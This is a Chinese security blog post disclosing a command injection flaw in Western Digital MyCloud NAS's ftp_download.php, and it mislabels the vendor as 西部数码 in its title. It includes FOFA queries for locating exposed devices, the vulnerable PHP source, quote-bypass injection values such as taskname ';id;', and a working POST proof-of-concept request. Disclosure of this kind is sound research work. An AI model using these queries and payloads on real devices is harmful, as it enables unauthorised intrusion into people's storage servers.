---
title: "西部数码 NAS ftp_download.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-ftp_download-rce.html
---

# 西部数码 NAS ftp\_download.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/11 12:11
* 610浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS ftp\_download.php中存在
[命令执行](https://mrxn.net/tag/rce)
漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看
`ftp_download.php`
其业务实现逻辑如下

```
<?php
//session_start();
//$r = new stdClass();
//$r->success = false;
//
//include ("../lib/login_checker.php");
//
///* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
//if (login_check() == 0)
//{
//  echo json_encode($r);
//  exit;
//}

define('FTP_DOWNLOAD_CONF', '/var/www/xml/ftp_download.xml');

$action = $_POST['action'];
if ($action == "")
    $action = $_GET['action'];

function get_list()
{
    $r = new stdClass();
    $i = 0;
    if (file_exists(FTP_DOWNLOAD_CONF))
    {
       $xml = simplexml_load_file(FTP_DOWNLOAD_CONF);
       foreach ($xml->ftp_download->item as $item) {
          $pname = sprintf("/tmp/r_%s!_ftpdl", (string)$item->task_name);
          $bar_percent = "";
          $bar_running_sour = "";
          $bar_speed = "";
          if (file_exists($pname))
          {
             $_backup_info = file_get_contents($pname);
             $_backup_info_arr = explode("\n", $_backup_info);
             $bar_percent = $_backup_info_arr[0];
             if (count($_backup_info_arr) == 4)
             {              
                $bar_running_sour = $_backup_info_arr[1];
                $bar_speed = $_backup_info_arr[2];
             }
             else if (count($_backup_info_arr) == 3)
             {
                $bar_running_sour = $_backup_info_arr[1];
             }
             else
             {
                $bar_running_sour = "";
             }  
             //$bar_running_sour = rtrim($_backup_info_arr[1], "/");

             if ((string)$item->status == "0" && $bar_percent == "100") @unlink($pname);
          }
          if ((string)$item->status == "0") $bar_percent = "100";

          //Source dir
          $sour_list = array();
          foreach ($item->sour as $sitem)
             $sour_list[] = (string)$sitem;

          //Incremental List
          $incremental_list = array();
          if ((string)$item->backup_mode == "3") //Incremental mode
          {
             /*Get Backup list */
             $list_xml_file = sprintf("/tmp/r_%s!_ftpdl_imcremental.xml", (string)$item->task_name);
             $cmd = sprintf("ftp_download -a '%s' -o '%s' -c jobrs_list", (string)$item->task_name, $list_xml_file);
             pclose(popen($cmd, 'r'));

             if (file_exists($list_xml_file))
             {
                $list_xml = simplexml_load_file($list_xml_file);
                foreach ($list_xml->backup as $im_item)
                   $incremental_list[] = array((string)$im_item->task_name, (string)$im_item->time);
                @unlink($list_xml_file); 
             }
          }

          $r->rows[] = array(
             'id' => $i,
             'cell' => array(
                /* 0 */    (string)$item->task_name,
                /* 1 */    '',
                /* 2 */    $sour_list,
                /* 3 */    $percent_list,
                /* 4 */    (string)$item->dest,
                /* 5 */    (string)$item->status,
                /* 6 */    (string)$item->backup_direction,
                /* 7 */    (string)$item->backup_mode,
                /* 8 */    '', //Action: Start/Stop, Edit, Del, Detail
                /* 9 */(string)$item->finished_time,
                /* 10 */(string)$item->status,
                /* 11 */$bar_percent,
                /* 12 */$bar_running_sour,
                /* 13 */$incremental_list,
                /* 14 */(string)$item->update_routine,
                /* 15 */(string)$item->week_day,
                /* 16 */(string)$item->hour,
                /* 17 */(string)$item->host,
                /* 18 */(string)$item->host_user,
                /* 19 */(string)$item->host_passwd,
                /* 20 */(string)$item->lang,
                /* 21 */$bar_speed,
             )
          );
          $i++;
       } 
    }

    $r->page = 1;
    $r->total = $i;
    return $r;
}
function stop_job($taskname)
{
    //Stop job
    $cmd = sprintf("ftp_download -a '%s' -c jobstop >/dev/null 2>&1", $taskname);
    pclose(popen($cmd, 'r'));
    sleep(2);

    $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
    file_put_contents($pname, "-10"); //Cancel
}

$r = new stdClass();
switch ($action)
{
    case "create":
    {
       $taskname = $_POST['taskname'];       
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];       
       $schedule = $_POST['schedule'];
       $schedule_type = $_POST['backup_sch_type'];
       $hour = $_POST['hour'];
       $week = $_POST['week'];
       $day = $_POST['day'];

       $host = $_POST['host'];
       $user = $_POST['user'];
       $pwd = $_POST['pwd'];
       $lang = $_POST['lang'];

       $sch_command = "";
       if ($schedule  == "0")$sch_command = "0,1,1";
       else if ($schedule_type  == "3")$sch_command = "3,1,".$hour; //daily
       else if ($schedule_type  == "2")$sch_command = "2,".$week.",".$hour; //weekly
       else if ($schedule_type  == "1")$sch_command = "1,".$day.",".$hour; //monthly

       $cmd = sprintf("ftp_download -a \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobadd",
                   $taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s \"%s\"", $val);

               $cmd .= " >/dev/null 2>&1";
       system($cmd);
       //pclose(popen($cmd, 'r'));
       $pname = sprintf("/tmp/r_ftpdl!_%s", $taskname);
       @unlink($pname);

       stop_job($taskname);

       //Start job
       //$cmd = sprintf("(ftp_download -a '%s' -c jobrun >/dev/null 2>&1)&", $taskname);
       $cmd = sprintf("ftp_download -a '%s' -c jobrun > /dev/null 2>&1 &", $taskname);
                system($cmd);
//     pclose(popen($cmd, 'r'));
//     sleep(2);

       $r = get_list();
       $r->success = true;       
       echo json_encode($r);
    }
       break;

    case "modify":
    {
       $taskname = $_POST['taskname'];       
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       //$backup_type = $_POST['backup_type'];
       $old_taskname = $_POST['old_taskname'];       

       $schedule = $_POST['schedule'];
       $schedule_type = $_POST['backup_sch_type'];
       $hour = $_POST['hour'];
       $week = $_POST['week'];
       $day = $_POST['day'];

       $host = $_POST['host'];
       $user = $_POST['user'];
       $pwd = $_POST['pwd'];
       $lang = $_POST['lang'];

       $sch_command = "";
       if ($schedule  == "0")$sch_command = "0,1,1";
       else if ($schedule_type  == "3")$sch_command = "3,1,".$hour; //daily
       else if ($schedule_type  == "2")$sch_command = "2,".$week.",".$hour; //weekly
       else if ($schedule_type  == "1")$sch_command = "1,".$day.",".$hour; //monthly

       stop_job($taskname);

       $cmd = sprintf("ftp_download -a \"%s\" -x \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobedit",
                   $taskname, $old_taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s \"%s\"", $val);
            $cmd .= " >/dev/null 2>&1";
       system($cmd);  
       //pclose(popen($cmd, 'r'));

       //Start job
       //$cmdS = sprintf("ftp_download -a '%s' -c jobrun &", $taskname); 
       $cmdS = sprintf("ftp_download -a '%s' -c jobrun > /dev/null 2>&1 &", $taskname); 
            system($cmdS); 
       //pclose(popen($cmdS, 'r'));
       sleep(2);

       $r = get_list();
       $r->cmd = $cmd;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "del":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $cmd = sprintf("ftp_download -a '%s' -c jobdel >/dev/null 2>&1", $taskname);
                system($cmd);
       //pclose(popen($cmd, 'r'));

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_jobs":
    {
       $taskname = $_POST['taskname'];

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $cmd = sprintf("ftp_download -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "stop_jobs":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_restore":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       file_put_contents($pname, "0"); //Cancel

       $list_xml_file = sprintf("/tmp/r_ftpdl!_restore_imcremental_%s.xml", $taskname);
       $cmd = sprintf("ftp_download -a '%s' -o '%s' -F %s -c jobrs &", $taskname, $list_xml_file, $_POST['restore_source']);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();      
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "get_list":
    {
       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

}
?>
```

多个功能（如创建、修改、删除任务）接收来自用户的 POST 参数，未经过滤或转义便直接使用
`sprintf`
拼接成操作系统命令，并由
`system()`
或
`pclose(popen())`
函数执行，导致攻击者可以
[注入任意系统命令](https://mrxn.net/tag/rce)
并获得远程代码执行能力。

* **用户可控点：**
  多个
  `case`
  分支中接收的
  `$_POST`
  参数，主要包括：
  + `action=create`
    :
    `taskname`
    ,
    `host`
    ,
    `user`
    ,
    `pwd`
    ,
    `dest_dir`
    等
  + `action=modify`
    :
    `taskname`
    ,
    `old_taskname`
    ,
    `host`
    ,
    `user`
    ,
    `pwd`
    ,
    `dest_dir`
    等
  + `action=del`
    :
    `taskname`
  + `action=go_restore`
    :
    `taskname`
    ,
    `restore_source`
* **参数的赋值处理：**
  以
  `action=create`
  为例，用户可控的
  `$taskname`
  等变量被直接代入
  `sprintf`
  函数，用于构造命令字符串
  `$cmd`
  。

```
$taskname = $_POST['taskname'];
// ... other $_POST variables
$cmd = sprintf("ftp_download -a \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobadd",
                $taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);
```

* **危险函数调用点：**
  拼接好的命令字符串
  `$cmd`
  被直接传递给
  `system()`
  函数执行。

```
system($cmd);
```

在其他分支中，也存在
`pclose(popen($cmd, 'r'))`
的调用，同样会
[执行命令](https://mrxn.net/tag/rce)
。

* 代码中虽然对部分参数使用了双引号（
  `"`
  ）或单引号（
  `'`
  ）进行包裹，但这并不能有效阻止命令注入。攻击者可以通过注入命令分隔符（如
  `;`
  ,
  `|`
  ,
  `&&`
  ）来执行附加的恶意命令。
  + **双引号绕过：**
    当参数被
    `"`
    包裹时，可注入
    `";<command>;"`
    。例如，
    `taskname`
    值为
    `mytask";id;"`
    。
  + **单引号绕过：**
    当参数被
    `'`
    包裹时，可注入
    `a' ; <command> ; '`
    。例如，
    `taskname`
    值为
    `mytask' ; id ; '`
    。
  + **无引号：**
    在
    `go_restore`
    功能中，
    `$_POST['restore_source']`
    参数未被任何引号包裹，可以直接注入命令。
* **总结：**
  无任何有效的输入过滤或转义机制，引号保护措施可被轻松绕过。

**action = "del" 分支 (单引号包裹，同样可注入):**

```
case "del":
{
    $taskname = $_POST['taskname'];
    // ...
    $cmd = sprintf("ftp_download -a '%s' -c jobdel >/dev/null 2>&1", $taskname);
    system($cmd); // <-- 危险函数执行
    // ...
}
```

# 漏洞复现

```
POST /web/addons/ftp_download.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
```

![西部数码 NAS ftp_download.php 命令执行漏洞](https://image.mrxn.net/73f90041378a4a28b266d4a834998f16.webp)

成功
[执行id命令](https://mrxn.net/tag/rce)
并在响应里回显

* 标签：
* [#
  代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  php](https://mrxn.net/tag/php)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[西部数码 NAS ftp\_download.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-ftp_download-rce.html)
  
文章链接：
<https://mrxn.net/jswz/west-nas-ftp_download-rce.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-ftp\_download-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-ftp\_download-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});